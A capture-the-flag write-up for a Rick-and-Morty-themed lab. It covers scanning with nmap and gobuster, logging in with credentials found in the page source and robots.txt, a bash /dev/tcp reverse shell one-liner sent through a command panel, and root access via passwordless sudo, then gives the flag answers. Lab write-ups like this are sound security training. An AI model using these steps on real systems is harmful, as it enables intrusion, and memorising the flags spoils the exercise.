At the start, access the target website:  

![image](https://github.com/user-attachments/assets/5b03add0-7511-437f-bd19-9e3a79321279)

<span style="line-height:0.5;">&nbsp;</span>

Next, inspect the page source to extract valuable information. In the page source you can identify the username: 
<pre> R1ckRul3s </pre>  

<span style="line-height:0.5;">&nbsp;</span>

Use nmap to scan the network and identify open ports on the target system:
```BASH
sudo nmap -sV -p- $ip
```

![image-1](https://github.com/user-attachments/assets/3d3bda10-eabc-4002-932b-1c8f6d2c3121)

The scan reveals that only ports 22 (SSH) and 80 (HTTP) are open. Let's check robots.txt file with curl, which returns:

![image-3](https://github.com/user-attachments/assets/20b18b7c-b51a-46e9-97c9-db838d2a2c93)
<pre>Wubbalubbadubdub</pre>

<span style="line-height:0.5;">&nbsp;</span>

Use Gobuster to identify hidden directories. Run:
```BASH
gobuster dir -u "http://$ip/" -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 64
```

![image-2](https://github.com/user-attachments/assets/91eedcd4-889c-4ee6-877c-c51114dc791a)

The only discovered directory is `/assets`, which contains several JavaScript and CSS files. We then focus on login.php for further exploitation. 

![image-4](https://github.com/user-attachments/assets/54663b94-dae0-4038-97ba-3afe70ef4405)

<span style="line-height:0.5;">&nbsp;</span>

Navigating to: `$ip/login.php` reveals the login interface. Upon logging in with the previously extracted credentials, the site redirects us, but everything seems blocked except for a `commands` tab. This suggests that the application may be vulnerable to a reverse shell injection.

![image-5](https://github.com/user-attachments/assets/b69c2868-d47e-4dde-b341-a6979baad055)

<span style="line-height:0.5;">&nbsp;</span>

Start a Netcat listener on your attacker machine:
```BASH
nc -lvnp 4444
```

<span style="line-height:0.5;">&nbsp;</span>

Then use the following payload to spawn a reverse shell:
```BASH
bash -c 'bash -i >& /dev/tcp/10.10.193.82/4444 0>&1'
```
![image-7](https://github.com/user-attachments/assets/4685e820-c75d-4fae-9f12-37bb0d4109f6)

<span style="line-height:0.5;">&nbsp;</span>

After clicking execute, the reverse shell connects back to your Netcat listener. To stabilize the shell, execute within your Netcat session:
```BASH
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![image-8](https://github.com/user-attachments/assets/6d0b3fe5-4ac4-4050-898e-59f77a803af8)

![image-9](https://github.com/user-attachments/assets/36b951cc-5b12-4ed2-a7ef-db23c429358e)

<span style="line-height:0.5;">&nbsp;</span>

### What is the first ingredient that Rick needs?
<pre>mr. meeseek hair</pre>

<span style="line-height:0.5;">&nbsp;</span>

Next, determine which users can execute commands with root privileges.  

![image-10](https://github.com/user-attachments/assets/12e273ea-8149-49a8-8ad6-31cdb62fd5de)

A quick inspection shows that the www-data user has full sudo access without a password:  

`(ALL) NOPASSWD: ALL`

```BASH
sudo su -
```

![image-11](https://github.com/user-attachments/assets/6e6edd26-28c9-4d01-862a-60b8b8ae1082)

<span style="line-height:0.5;">&nbsp;</span>

### What is the last and final ingredient?

![image-12](https://github.com/user-attachments/assets/b289d573-4a05-4acf-98bf-705b08ed6528)

<pre>fleeb juice</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What is the second ingredient in Rick’s potion?  

![image-13](https://github.com/user-attachments/assets/0e0d11e6-1a1c-4ef6-98de-e5797e2c0f81)

 
<pre>jerry tear</pre>
